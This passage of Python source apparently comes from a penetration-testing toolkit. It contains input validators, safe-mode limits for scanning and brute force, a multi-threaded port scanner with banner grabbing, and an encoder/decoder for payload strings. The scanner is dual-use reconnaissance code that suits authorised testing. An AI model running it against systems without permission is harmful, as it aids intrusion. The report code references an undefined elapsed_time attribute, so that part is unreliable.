        logger.warning("Safe mode disabled - destructive operations may be allowed")
    
    def check_safety_before_operation(self, operation_name: str, is_destructive: bool = False) -> bool:
        """Check if an operation is safe to perform."""
        if is_destructive and self.destructive_operations_disabled:
            logger.warning(f"Destructive operation '{operation_name}' blocked by safe mode")
            return False
        
        if self.safe_mode and is_destructive:
            if not safe_confirm(f"Operation '{operation_name}' may be destructive. Continue?"):
                logger.info(f"Operation '{operation_name}' cancelled by user")
                return False
        
        return True
    
    def validate_input(self, input_data: Any, input_type: str, required: bool = True) -> bool:
        """Validate input data based on type and requirements."""
        try:
            if required and (input_data is None or input_data == ""):
                logger.error(f"Required {input_type} input is missing")
                return False
            
            if input_type == "ip_address":
                return self._validate_ip_address(input_data)
            elif input_type == "port":
                return self._validate_port(input_data)
            elif input_type == "url":
                return self._validate_url(input_data)
            elif input_type == "file_path":
                return self._validate_file_path(input_data)
            elif input_type == "integer":
                return self._validate_integer(input_data)
            elif input_type == "string":
                return self._validate_string(input_data)
            else:
                logger.warning(f"Unknown input type: {input_type}")
                return True
                
        except Exception as e:
            logger.error(f"Input validation error for {input_type}: {e}")
            return False
    
    def _validate_ip_address(self, ip: str) -> bool:
        """Validate IP address format."""
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            logger.error(f"Invalid IP address: {ip}")
            return False
    
    def _validate_port(self, port: Any) -> bool:
        """Validate port number."""
        try:
            port_num = int(port)
            return 1 <= port_num <= 65535
        except (ValueError, TypeError):
            logger.error(f"Invalid port number: {port}")
            return False
    
    def _validate_url(self, url: str) -> bool:
        """Validate URL format."""
        try:
            result = urllib.parse.urlparse(url)
            return all([result.scheme, result.netloc])
        except Exception:
            logger.error(f"Invalid URL: {url}")
            return False
    
    def _validate_file_path(self, file_path: str) -> bool:
        """Validate file path."""
        try:
            path = Path(file_path)
            return path.exists() and path.is_file()
        except Exception:
            logger.error(f"Invalid file path: {file_path}")
            return False
    
    def _validate_integer(self, value: Any) -> bool:
        """Validate integer value."""
        try:
            int(value)
            return True
        except (ValueError, TypeError):
            logger.error(f"Invalid integer: {value}")
            return False
    
    def _validate_string(self, value: Any) -> bool:
        """Validate string value."""
        return isinstance(value, str) and len(value.strip()) > 0


class ErrorHandler:
    """Enhanced error handling and recovery system."""
    
    def __init__(self):
        self.error_count = 0
        self.max_errors = 10
        self.error_history = []
        self.critical_errors = []
    
    def handle_error(self, error: Exception, context: str = "", critical: bool = False) -> bool:
        """Handle an error with appropriate logging and recovery."""
        self.error_count += 1
        error_info = {
            'timestamp': datetime.datetime.now().isoformat(),
            'error_type': type(error).__name__,
            'error_message': str(error),
            'context': context,
            'critical': critical,
            'traceback': traceback.format_exc()
        }
        
        self.error_history.append(error_info)
        
        if critical:
            self.critical_errors.append(error_info)
            logger.critical(f"Critical error in {context}: {error}")
            return False
        
        logger.error(f"Error in {context}: {error}")
        
        # Check if we've exceeded max errors
        if self.error_count >= self.max_errors:
            logger.critical(f"Maximum error count ({self.max_errors}) exceeded. Stopping execution.")
            return False
        
        return True
    
    def graceful_exit(self, reason: str = "Unknown error"):
        """Perform graceful exit with cleanup."""
        logger.info(f"Performing graceful exit: {reason}")
        
        # Save error report
        self._save_error_report()
        
        # Cleanup temporary files
        self._cleanup_temp_files()
        
        # Final logging
        logger.info("Graceful exit completed")
    
    def _save_error_report(self):
        """Save error report to file."""
        try:
            error_report = {
                'exit_time': datetime.datetime.now().isoformat(),
                'total_errors': self.error_count,
                'critical_errors': len(self.critical_errors),
                'error_history': self.error_history
            }
            
            error_file = Path("reports") / f"error_report_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            error_file.parent.mkdir(exist_ok=True)
            
            with open(error_file, 'w') as f:
                json.dump(error_report, f, indent=2)
            
            logger.info(f"Error report saved: {error_file}")
        except Exception as e:
            logger.error(f"Failed to save error report: {e}")
    
    def _cleanup_temp_files(self):
        """Clean up temporary files."""
        try:
            temp_dir = Path(tempfile.gettempdir())
            toolkit_temp_files = list(temp_dir.glob("red_team_toolkit_*"))
            
            for temp_file in toolkit_temp_files:
                try:
                    if temp_file.is_file():
                        temp_file.unlink()
                    elif temp_file.is_dir():
                        shutil.rmtree(temp_file)
                except Exception as e:
                    logger.warning(f"Could not clean up temp file {temp_file}: {e}")
            
            logger.info(f"Cleaned up {len(toolkit_temp_files)} temporary files")
        except Exception as e:
            logger.error(f"Error during temp file cleanup: {e}")
    
    def get_error_summary(self) -> dict:
        """Get summary of error statistics."""
        return {
            'total_errors': self.error_count,
            'critical_errors': len(self.critical_errors),
            'error_types': self._get_error_type_distribution(),
            'recent_errors': self.error_history[-5:] if self.error_history else []
        }
    
    def _get_error_type_distribution(self) -> dict:
        """Get distribution of error types."""
        error_types = {}
        for error in self.error_history:
            error_type = error['error_type']
            error_types[error_type] = error_types.get(error_type, 0) + 1
        return error_types


class SafeDefaults:
    """Safe default values and configurations for destructive operations."""
    
    def __init__(self):
        self.defaults = {
            'network_scan': {
                'max_hosts': 10,
                'max_ports': 100,
                'timeout': 5,
                'rate_limit': 10
            },
            'brute_force': {
                'max_attempts': 100,
                'max_usernames': 5,
                'delay_between_attempts': 1
            },
            'web_testing': {
                'max_pages': 10,
                'max_depth': 2,
                'rate_limit': 5
            },
            'file_operations': {
                'max_file_size': 10 * 1024 * 1024,  # 10MB
                'allowed_extensions': ['.txt', '.log', '.json', '.xml', '.csv'],
                'backup_before_modify': True
            },
            'reporting': {
                'auto_save': True,
                'max_reports_per_session': 50,
                'cleanup_old_reports': True
            }
        }
    
    def get_safe_default(self, category: str, setting: str, user_value: Any = None) -> Any:
        """Get safe default value, preferring user value if within safe limits."""
        if category not in self.defaults or setting not in self.defaults[category]:
            logger.warning(f"Unknown setting: {category}.{setting}")
            return user_value
        
        safe_default = self.defaults[category][setting]
        
        if user_value is None:
            return safe_default
        
        # Validate user value against safe limits
        if self._is_value_safe(category, setting, user_value):
            return user_value
        else:
            logger.warning(f"User value {user_value} exceeds safe limit for {category}.{setting}. Using safe default: {safe_default}")
            return safe_default
    
    def _is_value_safe(self, category: str, setting: str, value: Any) -> bool:
        """Check if a value is within safe limits."""
        if category == 'network_scan':
            if setting == 'max_hosts' and isinstance(value, (int, float)):
                return 1 <= value <= 50
            elif setting == 'max_ports' and isinstance(value, (int, float)):
                return 1 <= value <= 1000
            elif setting == 'timeout' and isinstance(value, (int, float)):
                return 1 <= value <= 30
            elif setting == 'rate_limit' and isinstance(value, (int, float)):
                return 1 <= value <= 100
        
        elif category == 'brute_force':
            if setting == 'max_attempts' and isinstance(value, (int, float)):
                return 1 <= value <= 1000
            elif setting == 'max_usernames' and isinstance(value, (int, float)):
                return 1 <= value <= 20
            elif setting == 'delay_between_attempts' and isinstance(value, (int, float)):
                return 0.1 <= value <= 10
        
        elif category == 'web_testing':
            if setting == 'max_pages' and isinstance(value, (int, float)):
                return 1 <= value <= 100
            elif setting == 'max_depth' and isinstance(value, (int, float)):
                return 1 <= value <= 5
            elif setting == 'rate_limit' and isinstance(value, (int, float)):
                return 1 <= value <= 50
        
        elif category == 'file_operations':
            if setting == 'max_file_size' and isinstance(value, (int, float)):
                return 1024 <= value <= 100 * 1024 * 1024  # 1KB to 100MB
        
        return True  # Default to safe if unknown setting

# Initialize quality assurance and error handling
qa_system = QualityAssurance()
error_handler = ErrorHandler()
safe_defaults = SafeDefaults()

# Phase 1: Enhanced Logging Setup
def setup_logging():
    """Setup enhanced logging configuration."""
    log_level = getattr(logging, config.get('LOGGING', 'log_level', 'INFO').upper())
    log_file = config.get('LOGGING', 'log_file', 'reports/toolkit.log')
    log_format = config.get('LOGGING', 'log_format', '%(asctime)s - %(levelname)s - %(message)s')
    
    # Create reports directory if it doesn't exist
    reports_dir = Path(config.get('DEFAULT', 'report_directory', 'reports'))
    reports_dir.mkdir(exist_ok=True)
    
    # Setup file handler with rotation
    from logging.handlers import RotatingFileHandler
    file_handler = RotatingFileHandler(
        log_file,
        maxBytes=10*1024*1024,  # 10MB
        backupCount=5
    )
    file_handler.setFormatter(logging.Formatter(log_format))
    
    # Setup console handler
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setFormatter(logging.Formatter(log_format))
    
    # Setup root logger
    root_logger = logging.getLogger()
    root_logger.setLevel(log_level)
    root_logger.addHandler(file_handler)
    root_logger.addHandler(console_handler)
    
    return logging.getLogger(__name__)

logger = setup_logging()

# Color support
class Colors:
    """ANSI color codes for terminal output."""
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def colored(text: str, color: str) -> str:
    """Return colored text if colors are enabled."""
    if config.getboolean('DEFAULT', 'enable_colors', True):
        return f"{color}{text}{Colors.ENDC}"
    return text

# Phase 1: Enhanced Progress Bar System
class ProgressBar:
    """Enhanced progress bar with Rich and tqdm support."""
    
    def __init__(self, total: int, description: str = "Progress"):
        self.total = total
        self.current = 0
        self.description = description
        self.start_time = time.time()
        self.enable_rich = config.getboolean('DEFAULT', 'enable_progress_bars', True)
        
        # Initialize progress bar based on available libraries
        if self.enable_rich and RICH_AVAILABLE:
            self.progress = Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TextColumn("({task.completed}/{task.total})"),
                TimeElapsedColumn(),
                console=cli_manager.console
            )
            self.task_id = self.progress.add_task(description, total=total)
            self.progress.start()
        elif TQDM_AVAILABLE:
            self.progress = tqdm(total=total, desc=description, unit="items")
        else:
            self.progress = None
    
    def update(self, increment: int = 1):
        """Update progress bar."""
        self.current += increment
        
        if self.enable_rich and RICH_AVAILABLE and self.progress:
            self.progress.update(self.task_id, advance=increment)
        elif TQDM_AVAILABLE and self.progress:
            self.progress.update(increment)
        else:
            # Fallback to basic progress display
            percentage = (self.current / self.total) * 100
            elapsed = time.time() - self.start_time
            
            if self.current > 0:
                eta = (elapsed / self.current) * (self.total - self.current)
                eta_str = f"ETA: {eta:.1f}s"
            else:
                eta_str = "ETA: --"
            
            bar_length = 30
            filled_length = int(bar_length * self.current // self.total)
            bar = '█' * filled_length + '-' * (bar_length - filled_length)
            
            print(f"\r{self.description}: |{bar}| {percentage:.1f}% ({self.current}/{self.total}) {eta_str}", end='', flush=True)
    
    def finish(self):
        """Finish progress bar."""
        elapsed = time.time() - self.start_time
        
        if self.enable_rich and RICH_AVAILABLE and self.progress:
            self.progress.stop()
            if cli_manager.enable_rich:
                cli_manager.console.print(f"✓ [green]{self.description}[/green] completed in [cyan]{elapsed:.2f}s[/cyan]")
            else:
                print(f"✓ {self.description} completed in {elapsed:.2f} seconds")
        elif TQDM_AVAILABLE and self.progress:
            self.progress.close()
            print(f"✓ Completed in {elapsed:.2f} seconds")
        else:
            print(f"\n✓ Completed in {elapsed:.2f} seconds")

# Rate limiting
class RateLimiter:
    """Simple rate limiter for API calls and network requests."""
    
    def __init__(self, max_requests: int = 100, time_window: int = 60):
        self.max_requests = max_requests
        self.time_window = time_window
        self.requests = []
        self.lock = threading.Lock()
    
    def can_proceed(self) -> bool:
        """Check if request can proceed."""
        now = time.time()
        
        with self.lock:
            # Remove old requests
            self.requests = [req_time for req_time in self.requests if now - req_time < self.time_window]
            
            if len(self.requests) < self.max_requests:
                self.requests.append(now)
                return True
            return False
    
    def wait_if_needed(self):
        """Wait if rate limit is exceeded."""
        while not self.can_proceed():
            time.sleep(0.1)

# Global rate limiter
rate_limiter = RateLimiter(
    max_requests=config.getint('DEFAULT', 'rate_limit', 100),
    time_window=60
)

# Enhanced validation functions
def validate_ip(ip: str) -> bool:
    """Validate if a string is a valid IP address."""
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def validate_hostname(hostname: str) -> bool:
    """Validate if a string is a valid hostname."""
    if not hostname or len(hostname) > 253:
        return False
    
    # Check if hostname contains only valid characters
    if not re.match(r'^[a-zA-Z0-9\-\.]+$', hostname):
        return False
    
    # Check if it's not all numeric (to avoid confusion with IP addresses)
    if hostname.replace('.', '').isdigit():
        return False
    
    return True

def validate_port(port: str) -> bool:
    """Validate if a string is a valid port number."""
    try:
        port_num = int(port)
        return 1 <= port_num <= 65535
    except ValueError:
        return False

def validate_url(url: str) -> bool:
    """Validate if a string is a valid URL."""
    try:
        result = urllib.parse.urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def safe_input(prompt: str) -> Optional[str]:
    """Enhanced safe input with CLI manager support."""
    try:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            return Prompt.ask(f"[cyan]{prompt}[/cyan]").strip()
        else:
            return input(f"{prompt}: ").strip()
    except (EOFError, KeyboardInterrupt):
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("[yellow]⚠️  Operation cancelled.[/yellow]")
        else:
            print(colored("⚠️  Operation cancelled.", Colors.WARNING))
        return None

def safe_file_input(prompt: str) -> Optional[str]:
    """Enhanced safe file input with validation."""
    file_path = safe_input(prompt)
    if not file_path:
        return None
    
    # Basic path validation
    if os.path.exists(file_path):
        return file_path
    else:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"[red]File not found: {file_path}[/red]")
        else:
            print(colored(f"File not found: {file_path}", Colors.FAIL))
        return None

def safe_confirm(prompt: str) -> bool:
    """Enhanced confirmation with CLI manager support."""
    try:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            return Confirm.ask(f"[yellow]{prompt}[/yellow]")
        else:
            response = input(f"{prompt} (y/n): ").lower()
            return response in ['y', 'yes']
    except (EOFError, KeyboardInterrupt):
        return False

# Enhanced utility functions
def calculate_entropy(data: bytes) -> float:
    """Calculate Shannon entropy of data to detect encrypted/compressed content."""
    if not data:
        return 0.0
    
    # Count byte frequencies
    byte_counts = {}
    for byte in data:
        byte_counts[byte] = byte_counts.get(byte, 0) + 1
    
    # Calculate entropy using Shannon's formula: H = -sum(p * log2(p))
    import math
    entropy = 0.0
    data_len = len(data)
    for count in byte_counts.values():
        probability = count / data_len
        if probability > 0:
            entropy -= probability * math.log2(probability)
    
    return entropy

def is_likely_encrypted(data: bytes) -> bool:
    """Determine if data is likely encrypted or compressed based on entropy."""
    entropy = calculate_entropy(data)
    # High entropy (>7.5) suggests encrypted/compressed content
    return entropy > 7.5

def sanitize_filename(filename: str) -> str:
    """Sanitize filename for safe file operations."""
    # Remove or replace unsafe characters
    unsafe_chars = '<>:"/\\|?*'
    for char in unsafe_chars:
        filename = filename.replace(char, '_')
    return filename

def generate_report_filename(tool_name: str, extension: str = 'txt') -> str:
    """Generate a timestamped report filename."""
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_tool_name = sanitize_filename(tool_name)
    return f"{safe_tool_name}_report_{timestamp}.{extension}"

def save_report(content: str, tool_name: str, extension: str = 'txt') -> str:
    """Save report content to file."""
    if not config.getboolean('DEFAULT', 'save_reports', True):
        return ""
    
    reports_dir = Path(config.get('DEFAULT', 'report_directory', 'reports'))
    reports_dir.mkdir(exist_ok=True)
    
    filename = generate_report_filename(tool_name, extension)
    filepath = reports_dir / filename
    
    try:
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(content)
        logger.info(f"Report saved: {filepath}")
        return str(filepath)
    except Exception as e:
        logger.error(f"Failed to save report: {e}")
        return ""

def port_scanner():
    """Enhanced multi-threaded port scanner with service fingerprinting."""
    print("\n[Enhanced Port Scanner]")
    print("⚠️  WARNING: Only scan systems you own or have explicit permission to test.")
    
    target = safe_input("Enter target host/IP: ")
    if not target or not validate_ip(target) and not validate_hostname(target):
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("[red]Invalid target. Please enter a valid IP address or hostname.[/red]")
        else:
            print(colored("Invalid target. Please enter a valid IP address or hostname.", Colors.FAIL))
        return
    
    # Enhanced scan options
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print("\n[bold cyan]Scan Types:[/bold cyan]")
        cli_manager.console.print("1. [green]Quick Scan[/green] - Top 20 ports (fast)")
        cli_manager.console.print("2. [yellow]Common Scan[/yellow] - Top 100 ports (balanced)")
        cli_manager.console.print("3. [red]Full Scan[/red] - All 65535 ports (comprehensive)")
        cli_manager.console.print("4. [blue]Custom Port Range[/blue] - User-defined ports")
        cli_manager.console.print("5. [magenta]Service Scan[/magenta] - Common ports with service detection")
    else:
        print("\nScan Types:")
        print("1. Quick Scan (Top 20 ports)")
        print("2. Common Scan (Top 100 ports)")
        print("3. Full Scan (All 65535 ports)")
        print("4. Custom Port Range")
        print("5. Service Scan (Common ports with service detection)")
    
    scan_type = safe_input("Select scan type (1-5): ")
    if not scan_type:
        return
    
    # Define port ranges based on scan type
    if scan_type == "1":
        ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
        scan_name = "Quick Scan"
        service_detection = False
    elif scan_type == "2":
        ports = list(range(1, 101)) + [443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
        scan_name = "Common Scan"
        service_detection = False
    elif scan_type == "3":
        ports = list(range(1, 65536))
        scan_name = "Full Scan"
        service_detection = False
    elif scan_type == "4":
        start_port = safe_input("Enter start port (1-65535): ")
        end_port = safe_input("Enter end port (1-65535): ")
        try:
            start_port = int(start_port)
            end_port = int(end_port)
            if 1 <= start_port <= end_port <= 65535:
                ports = list(range(start_port, end_port + 1))
                scan_name = f"Custom Scan ({start_port}-{end_port})"
                service_detection = safe_confirm("Enable service detection?")
            else:
                if cli_manager.enable_rich and RICH_AVAILABLE:
                    cli_manager.console.print("[red]Invalid port range.[/red]")
                else:
                    print(colored("Invalid port range.", Colors.FAIL))
                return
        except ValueError:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print("[red]Invalid port numbers.[/red]")
            else:
                print(colored("Invalid port numbers.", Colors.FAIL))
            return
    elif scan_type == "5":
        ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 1433, 1521, 5432, 6379, 27017]
        scan_name = "Service Scan"
        service_detection = True
    else:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("[red]Invalid scan type.[/red]")
        else:
            print(colored("Invalid scan type.", Colors.FAIL))
        return
    
    # Advanced options
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold green]Starting {scan_name} on {target}[/bold green]")
        cli_manager.console.print(f"[dim]Scanning {len(ports)} ports with service detection: {service_detection}[/dim]")
    else:
        print(f"\nStarting {scan_name} on {target}...")
        print(f"Scanning {len(ports)} ports...")
        print(f"Service detection: {service_detection}")
    
    # Initialize progress bar
    progress = ProgressBar(len(ports), f"Port Scan - {target}")
    
    open_ports = []
    timeout = config.getint('SCANNING', 'port_scan_timeout', 3)
    max_threads = config.getint('DEFAULT', 'max_threads', 50)
    
    def scan_port(port):
        """Enhanced port scanning with service detection."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((target, port))
            
            if result == 0:
                service_info = {"port": port, "service": get_service_name(port)}
                
                # Enhanced service fingerprinting
                if service_detection:
                    try:
                        # Try to get banner
                        sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                        banner = sock.recv(1024).decode('utf-8', errors='ignore')
                        if banner:
                            service_info["banner"] = banner.strip()
                    except:
                        pass
                    
                    # Additional service detection
                    if port == 80 or port == 443:
                        service_info["type"] = "Web Server"
                    elif port == 22:
                        service_info["type"] = "SSH"
                    elif port == 21:
                        service_info["type"] = "FTP"
                    elif port == 25:
                        service_info["type"] = "SMTP"
                    elif port == 53:
                        service_info["type"] = "DNS"
                    elif port == 3306:
                        service_info["type"] = "MySQL"
                    elif port == 5432:
                        service_info["type"] = "PostgreSQL"
                    elif port == 27017:
                        service_info["type"] = "MongoDB"
                    elif port == 6379:
                        service_info["type"] = "Redis"
                    else:
                        service_info["type"] = "Unknown"
                
                sock.close()
                return service_info
            else:
                sock.close()
                return None
        except Exception as e:
            return None
    
    # Multi-threaded scanning with rate limiting
    rate_limiter = RateLimiter(config.getint('DEFAULT', 'rate_limit', 100), 60)
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        future_to_port = {executor.submit(scan_port, port): port for port in ports}
        
        for future in as_completed(future_to_port):
            port = future_to_port[future]
            try:
                result = future.result()
                if result:
                    open_ports.append(result)
                    service_name = result.get("service", "unknown")
                    service_type = result.get("type", "")
                    banner = result.get("banner", "")
                    
                    if cli_manager.enable_rich and RICH_AVAILABLE:
                        cli_manager.console.print(f"\n[green][+] Port {port}/tcp open[/green] - {service_name}")
                        if service_type and service_type != "Unknown":
                            cli_manager.console.print(f"    [cyan]Type:[/cyan] {service_type}")
                        if banner:
                            cli_manager.console.print(f"    [yellow]Banner:[/yellow] {banner[:100]}...")
                    else:
                        print(f"\n[+] Port {port}/tcp open - {service_name}")
                        if service_type and service_type != "Unknown":
                            print(f"    Type: {service_type}")
                        if banner:
                            print(f"    Banner: {banner[:100]}...")
                
                progress.update()
                rate_limiter.wait_if_needed()
                
            except Exception as e:
                progress.update()
    
    progress.finish()
    
    # Display comprehensive results
    if open_ports:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"\n[bold green]✓ Scan completed! Found {len(open_ports)} open ports:[/bold green]")
            
            table = Table(title="Open Ports Summary", show_header=True, header_style="bold magenta")
            table.add_column("Port", style="cyan", no_wrap=True)
            table.add_column("Service", style="green")
            table.add_column("Type", style="yellow")
            table.add_column("Banner", style="white")
            
            for port_info in sorted(open_ports, key=lambda x: x["port"]):
                table.add_row(
                    str(port_info["port"]),
                    port_info.get("service", "unknown"),
                    port_info.get("type", ""),
                    port_info.get("banner", "")[:50] + "..." if len(port_info.get("banner", "")) > 50 else port_info.get("banner", "")
                )
            
            cli_manager.console.print(table)
        else:
            print(f"\n✓ Scan completed! Found {len(open_ports)} open ports:")
            for port_info in sorted(open_ports, key=lambda x: x["port"]):
                print(f"  {port_info['port']}/tcp - {port_info.get('service', 'unknown')}")
                if port_info.get("type"):
                    print(f"    Type: {port_info['type']}")
                if port_info.get("banner"):
                    print(f"    Banner: {port_info['banner'][:100]}...")
        
        # Enhanced report generation
        report_content = f"""
Enhanced Port Scan Report
========================
Target: {target}
Scan Type: {scan_name}
Service Detection: {service_detection}
Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Duration: {progress.elapsed_time:.2f} seconds
Threads Used: {max_threads}

Open Ports:
{chr(10).join([f'{p["port"]}/tcp - {p.get("service", "unknown")} ({p.get("type", "Unknown")})' for p in sorted(open_ports, key=lambda x: x["port"])])}

Service Details:
{chr(10).join([f'Port {p["port"]}: {p.get("banner", "No banner")}' for p in open_ports if p.get("banner")])}

Total Open Ports: {len(open_ports)}
        """
        save_report(report_content.strip(), f"enhanced_port_scan_{target}")
    else:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"\n[bold green]✓ Scan completed! No open ports found on {target}.[/bold green]")
        else:
            print(f"\n✓ Scan completed! No open ports found on {target}.")
    
    logger.info(f"Enhanced port scan completed on {target}: {len(open_ports)} open ports found")


def payload_encoder():
    """Enhanced payload encoder/decoder with multiple encoding methods."""
    print("\n[Enhanced Payload Encoder/Decoder]")
    
    while True:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("\n[bold cyan]Encoding/Decoding Options:[/bold cyan]")
            cli_manager.console.print("1. [green]Base64 Encode[/green] - Standard Base64 encoding")
            cli_manager.console.print("2. [green]Base64 Decode[/green] - Base64 decoding")
            cli_manager.console.print("3. [yellow]Base32 Encode[/yellow] - Base32 encoding")
            cli_manager.console.print("4. [yellow]Base32 Decode[/yellow] - Base32 decoding")
            cli_manager.console.print("5. [blue]URL Encode[/blue] - URL percent encoding")
            cli_manager.console.print("6. [blue]URL Decode[/blue] - URL percent decoding")
            cli_manager.console.print("7. [red]Hex Encode[/red] - Hexadecimal encoding")
            cli_manager.console.print("8. [red]Hex Decode[/red] - Hexadecimal decoding")
            cli_manager.console.print("9. [magenta]ROT13[/magenta] - ROT13 cipher")
            cli_manager.console.print("10. [cyan]Caesar Cipher[/cyan] - Custom shift cipher")
            cli_manager.console.print("11. [green]Binary Encode[/green] - Binary encoding")
            cli_manager.console.print("12. [green]Binary Decode[/green] - Binary decoding")
            cli_manager.console.print("13. [yellow]HTML Encode[/yellow] - HTML entity encoding")
            cli_manager.console.print("14. [yellow]HTML Decode[/yellow] - HTML entity decoding")
            cli_manager.console.print("15. [blue]Multiple Formats[/blue] - Encode in all formats")
            cli_manager.console.print("0. [white]Back to main menu[/white]")
        else:
            print("\nEncoding/Decoding Options:")
            print("1. Base64 Encode - Standard Base64 encoding")
            print("2. Base64 Decode - Base64 decoding")
            print("3. Base32 Encode - Base32 encoding")
            print("4. Base32 Decode - Base32 decoding")
            print("5. URL Encode - URL percent encoding")
            print("6. URL Decode - URL percent decoding")
            print("7. Hex Encode - Hexadecimal encoding")
            print("8. Hex Decode - Hexadecimal decoding")
            print("9. ROT13 - ROT13 cipher")
            print("10. Caesar Cipher - Custom shift cipher")
            print("11. Binary Encode - Binary encoding")
            print("12. Binary Decode - Binary decoding")
            print("13. HTML Encode - HTML entity encoding")
            print("14. HTML Decode - HTML entity decoding")
            print("15. Multiple Formats - Encode in all formats")
            print("0. Back to main menu")
        
        choice = safe_input("Select operation: ")
        if not choice:
            return
        
        if choice == "0":
            return
        
        if choice == "15":  # Multiple Formats
            multiple_formats_encoder()
            continue
        
        text = safe_input("Enter text: ")
        if not text:
            continue
        
        try:
            if choice == "1":  # Base64 Encode
                encoded = base64.b64encode(text.encode()).decode()
                display_result("Base64 Encoded", encoded)
            
            elif choice == "2":  # Base64 Decode
                try:
                    decoded = base64.b64decode(text.encode()).decode()
                    display_result("Base64 Decoded", decoded)
                except Exception as e:
                    display_error("Base64 Decode Error", str(e))
            
            elif choice == "3":  # Base32 Encode
                encoded = base64.b32encode(text.encode()).decode()
                display_result("Base32 Encoded", encoded)
            
            elif choice == "4":  # Base32 Decode
                try:
                    decoded = base64.b32decode(text.encode()).decode()
                    display_result("Base32 Decoded", decoded)
                except Exception as e:
                    display_error("Base32 Decode Error", str(e))
            
            elif choice == "5":  # URL Encode
                encoded = urllib.parse.quote(text)
                display_result("URL Encoded", encoded)
            
            elif choice == "6":  # URL Decode
                try:
                    decoded = urllib.parse.unquote(text)
                    display_result("URL Decoded", decoded)
                except Exception as e:
                    display_error("URL Decode Error", str(e))
            
            elif choice == "7":  # Hex Encode
                encoded = text.encode().hex()
                display_result("Hex Encoded", encoded)
            
            elif choice == "8":  # Hex Decode
                try:
                    decoded = bytes.fromhex(text).decode()
                    display_result("Hex Decoded", decoded)
                except Exception as e:
                    display_error("Hex Decode Error", str(e))
            
            elif choice == "9":  # ROT13
                decoded = codecs.decode(text, 'rot13')
                display_result("ROT13", decoded)
            
            elif choice == "10":  # Caesar Cipher
                shift_input = safe_input("Enter shift value (1-25): ")
                if not shift_input:
                    continue
                try:
                    shift = int(shift_input)
                    if not (1 <= shift <= 25):
                        if cli_manager.enable_rich and RICH_AVAILABLE:
                            cli_manager.console.print("[red]Shift must be between 1 and 25.[/red]")
                        else:
                            print("Shift must be between 1 and 25.")
                        continue
                    
                    # Caesar cipher implementation
                    result = ""
                    for char in text:
                        if char.isalpha():
                            ascii_offset = ord('A') if char.isupper() else ord('a')
                            shifted = (ord(char) - ascii_offset + shift) % 26
                            result += chr(shifted + ascii_offset)
                        else:
                            result += char
                    display_result(f"Caesar Cipher (shift {shift})", result)
                except ValueError:
                    if cli_manager.enable_rich and RICH_AVAILABLE:
                        cli_manager.console.print("[red]Invalid shift value.[/red]")
                    else:
                        print("Invalid shift value.")
            
            elif choice == "11":  # Binary Encode
                binary = ' '.join(format(ord(char), '08b') for char in text)
                display_result("Binary Encoded", binary)
            
            elif choice == "12":  # Binary Decode
                try:
                    # Remove spaces and convert binary to text
                    binary_clean = text.replace(' ', '')
                    if len(binary_clean) % 8 != 0:
                        raise ValueError("Invalid binary length")
                    
                    decoded = ""
                    for i in range(0, len(binary_clean), 8):
                        byte = binary_clean[i:i+8]
                        decoded += chr(int(byte, 2))
                    display_result("Binary Decoded", decoded)
                except Exception as e:
                    display_error("Binary Decode Error", str(e))
            
            elif choice == "13":  # HTML Encode
                html_entities = {
                    '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;'
                }
                encoded = text
                for char, entity in html_entities.items():
                    encoded = encoded.replace(char, entity)
                display_result("HTML Encoded", encoded)
            
            elif choice == "14":  # HTML Decode
                html_entities = {
                    '&lt;': '<', '&gt;': '>', '&amp;': '&', '&quot;': '"', '&#39;': "'"
                }
                decoded = text
                for entity, char in html_entities.items():
                    decoded = decoded.replace(entity, char)
                display_result("HTML Decoded", decoded)
            
            else:
                if cli_manager.enable_rich and RICH_AVAILABLE:
                    cli_manager.console.print("[red]Invalid option. Please try again.[/red]")
                else:
                    print("Invalid option. Please try again.")
        
        except Exception as e:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"[red]Error: {e}[/red]")
            else:
                print(f"Error: {e}")


def display_result(operation, result):
    """Display encoding/decoding result with Rich formatting."""
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold green]{operation}:[/bold green]")
        cli_manager.console.print(f"[cyan]{result}[/cyan]")
        
        # Show additional info
